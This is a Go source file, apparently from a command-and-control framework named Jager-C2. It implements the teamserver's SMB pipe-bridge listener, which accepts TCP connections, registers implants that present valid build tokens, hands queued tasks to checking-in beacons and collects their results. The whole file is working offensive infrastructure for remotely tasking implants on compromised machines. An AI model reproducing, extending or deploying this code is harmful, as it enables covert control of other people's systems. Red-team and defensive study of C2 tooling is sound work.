package listeners

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"

	"github.com/0xhackerfren/Jager-C2/teamserver/internal/crypto"
	pb "github.com/0xhackerfren/Jager-C2/teamserver/proto/jagerpb"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/sessions"
	"go.uber.org/zap"
)

// SMBListener implements C2 over named pipes using a TCP-based SMB pipe proxy.
// For internal P2P mesh, implants connect to each other's named pipes.
// The teamserver-side uses TCP as the transport bridge for cross-network pipe communication.
type SMBListener struct {
	id       string
	cfg      *pb.ListenerConfig
	sessions *sessions.Manager
	tasks    TaskQueue
	builds   BuildStore
	logger   *zap.Logger

	listener net.Listener
	done     chan struct{}
	wg       sync.WaitGroup
}

func NewSMBListener(cfg *pb.ListenerConfig, sess *sessions.Manager, tq TaskQueue, bs BuildStore, logger *zap.Logger) (*SMBListener, error) {
	return &SMBListener{
		id:       cfg.Id,
		cfg:      cfg,
		sessions: sess,
		tasks:    tq,
		builds:   bs,
		logger:   logger.Named("smb"),
		done:     make(chan struct{}),
	}, nil
}

func (l *SMBListener) Start() error {
	addr := fmt.Sprintf("%s:%d", l.cfg.BindHost, l.cfg.BindPort)
	var err error
	l.listener, err = net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("listen TCP for SMB bridge: %w", err)
	}

	l.wg.Add(1)
	go l.acceptLoop()
	l.logger.Info("SMB pipe bridge listener started", zap.String("addr", addr))
	return nil
}

func (l *SMBListener) Stop() error {
	close(l.done)
	if l.listener != nil {
		l.listener.Close()
	}
	l.wg.Wait()
	return nil
}

func (l *SMBListener) ID() string {
	return l.id
}

func (l *SMBListener) Config() *pb.ListenerConfig {
	return l.cfg
}

func (l *SMBListener) acceptLoop() {
	defer l.wg.Done()

	for {
		conn, err := l.listener.Accept()
		if err != nil {
			select {
			case <-l.done:
				return
			default:
				l.logger.Error("accept error", zap.Error(err))
				continue
			}
		}

		l.wg.Add(1)
		go l.handleConn(conn)
	}
}

// handleConn processes a single pipe-bridged connection.
// Protocol: length-prefixed JSON messages over TCP.
// Message format: [4-byte big-endian length][JSON payload]
func (l *SMBListener) handleConn(conn net.Conn) {
	defer l.wg.Done()
	defer conn.Close()

	for {
		select {
		case <-l.done:
			return
		default:
		}

		// Read message length
		lenBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lenBuf); err != nil {
			return
		}
		msgLen := binary.BigEndian.Uint32(lenBuf)
		if msgLen > 10*1024*1024 { // 10MB max
			l.logger.Warn("message too large", zap.Uint32("size", msgLen))
			return
		}

		// Read message body
		msgBuf := make([]byte, msgLen)
		if _, err := io.ReadFull(conn, msgBuf); err != nil {
			return
		}

		// Parse and dispatch
		response, closeConn := l.dispatch(msgBuf)

		// Send response
		respLen := make([]byte, 4)
		binary.BigEndian.PutUint32(respLen, uint32(len(response)))
		conn.Write(respLen)
		conn.Write(response)
		if closeConn {
			return
		}
	}
}

type pipeMessage struct {
	Type      string          `json:"type"`
	SessionID string          `json:"session_id"`
	Data      json.RawMessage `json:"data,omitempty"`
}

func (l *SMBListener) dispatch(data []byte) ([]byte, bool) {
	var msg pipeMessage
	if err := json.Unmarshal(data, &msg); err != nil {
		return []byte(`{"error":"invalid message"}`), false
	}

	switch msg.Type {
	case "register":
		return l.handleRegister(msg)
	case "checkin":
		return l.handleCheckin(msg), false
	case "result":
		return l.handleResult(msg), false
	default:
		return []byte(`{"error":"unknown message type"}`), false
	}
}

func (l *SMBListener) handleRegister(msg pipeMessage) ([]byte, bool) {
	var reg struct {
		pb.ImplantRegistration
		BuildToken string `json:"build_token"`
		Token      string `json:"token"`
	}
	if err := json.Unmarshal(msg.Data, &reg); err != nil {
		return []byte(`{"error":"invalid registration"}`), true
	}

	token := reg.BuildToken
	if token == "" {
		token = reg.Token
	}
	if reg.BuildId == "" || token == "" {
		l.logger.Warn("SMB registration missing build credentials",
			zap.String("implant_id", reg.ImplantId))
		return []byte(`{"error":"forbidden"}`), true
	}
	if !crypto.ValidateBuildToken(reg.BuildId, token) {
		l.logger.Warn("SMB registration rejected: invalid build token",
			zap.String("build_id", reg.BuildId),
			zap.String("implant_id", reg.ImplantId))
		return []byte(`{"error":"forbidden"}`), true
	}

	reg.Transport = pb.Transport_TRANSPORT_SMB
	l.sessions.RegisterBeacon(&reg.ImplantRegistration, 10, 0)

	resp, _ := json.Marshal(map[string]interface{}{
		"status": "ok",
		"id":     reg.ImplantId,
	})
	return resp, false
}

func (l *SMBListener) handleCheckin(msg pipeMessage) []byte {
	l.sessions.Checkin(msg.SessionID)
	l.tasks.RedeliverSentTasks(msg.SessionID)

	pending := l.tasks.Dequeue(msg.SessionID, 10)
	type taskPayload struct {
		ID   string `json:"id"`
		Type int32  `json:"type"`
		Data []byte `json:"data,omitempty"`
	}
	payloads := make([]taskPayload, 0, len(pending))
	for _, t := range pending {
		payloads = append(payloads, taskPayload{
			ID:   t.Id,
			Type: int32(t.Type),
			Data: t.RequestData,
		})
	}

	resp, _ := json.Marshal(map[string]interface{}{"tasks": payloads})
	return resp
}

func (l *SMBListener) handleResult(msg pipeMessage) []byte {
	var result struct {
		TaskID string `json:"task_id"`
		Output []byte `json:"output"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal(msg.Data, &result); err != nil {
		return []byte(`{"error":"invalid result"}`)
	}

	l.tasks.Complete(result.TaskID, msg.SessionID, result.Output, result.Error)
	return []byte(`{"status":"ok"}`)
}
